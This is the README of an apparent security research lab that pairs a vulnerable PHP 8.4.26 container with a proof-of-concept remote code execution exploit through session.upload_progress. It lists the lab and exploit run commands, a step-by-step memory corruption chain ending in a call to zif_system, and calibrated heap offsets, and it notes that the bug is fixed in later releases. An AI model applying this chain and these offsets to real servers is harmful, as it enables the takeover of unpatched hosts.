# PHP 8.4.26 php2shell RCE lab

Authorized local research only.

This repository contains a minimal vulnerable PHP target and a standalone
plain-HTTP exploit for the pre-patch PHP `session.upload_progress` issue.
The target page is only:

```php
<?php echo "OK\n"; ?>
```

It does not call `session_start()`, install an application plugin, or require
a deserialization gadget. The exploit leaks the Zend MM and `libphp` bases,
forges a session reference and reaches `zif_system`.

## Verified environment

```text
PHP       8.4.26 NTS mod_php
Apache    2.4.68 prefork, one worker
Platform  linux/amd64
Limits    display_errors=On, memory_limit=8M, post_max_size=64M
```

The PHP module comes from the official `php:8.4.26-apache` image. The Apache
layer is rebuilt from the official 2.4.68 source release.

The chain was reproduced on three independently recreated containers. The
proof is:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Requirements

- Docker
- Bash
- Python 3.10+
- `curl`
- Apple Silicon hosts are supported through `--platform linux/amd64`

## Start the lab

```bash
./start-lab.sh
```

The first run builds the pinned Apache 2.4.68 image. The default URL is:

```text
http://127.0.0.1:8088/index.php
```

Change the port if needed:

```bash
PORT=18088 ./start-lab.sh
```

Stop it with:

```bash
./start-lab.sh stop
```

## Run the PoC

The target URL is always a command-line argument:

```bash
./poc.py http://127.0.0.1:8088/index.php
```

Expected output:

```text
[*] leak: request A
[*] leak: request B
[+] chunk=...
[+] dtor=...
[+] HTDATA=...
[+] zif_system=...
[*] fire: request A
[*] fire: request B
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The proof is written to `out/p1`.

Only a non-empty proof file is accepted as success. A worker crash, an empty
HTTP response, or `zend_mm_heap corrupted` is not accepted as RCE evidence.

## How it works

1. Request A leaves a dangling `PS(id)` string after a pre-RINIT OOM.
2. Request B forges its length and forces a large out-of-bounds read into
   `Set-Cookie`, exposing Zend MM chunk pointers.
3. A second view of the same primitive places real HashTables in the leaked
   window and exposes their `pDestructor` code pointer.
4. Fire request A leaves a dangling `PS(http_session_vars)` reference.
5. A live 31-byte multipart value reclaims that reference with a forged
   `IS_REFERENCE`.
6. Reference destruction reaches a fake HashTable whose `pDestructor` is
   `zif_system`, executing `id>/out/p1`.

The terminal call intentionally crashes the worker after writing the proof.

## Calibrated values

```text
heap leak forge filler count       841
heap leak arrays                  150
heap leak forged length           0x80000
fire A pads                       80 x (name length=7, value length=1)
fire A SID length                 100
fire B live-reference carriers    200
fire B live-reference length      31
fire B fill fields                80
fire B mask fields                8
HTDATA                            chunk + 0x7e0d8
zif_system                        leaked pDestructor - 0x1f97f0
```

## Scope and limitations

This is a build-specific PoC, not a universal exploit:

- PHP 8.4.27, 8.3.36, 8.2.35, and 8.5.12 contain the fix.
- A rebuilt or upgraded target may require different offsets and heap shapes.
- The current terminal is calibrated for the x86_64 libphp ABI.
- The chain requires mod_php, one prefork worker, and the lab's memory limits.
- PHP-FPM, multi-worker deployments, and ARM64 are outside the verified scope.
- `display_errors=On` is required by the current leak.
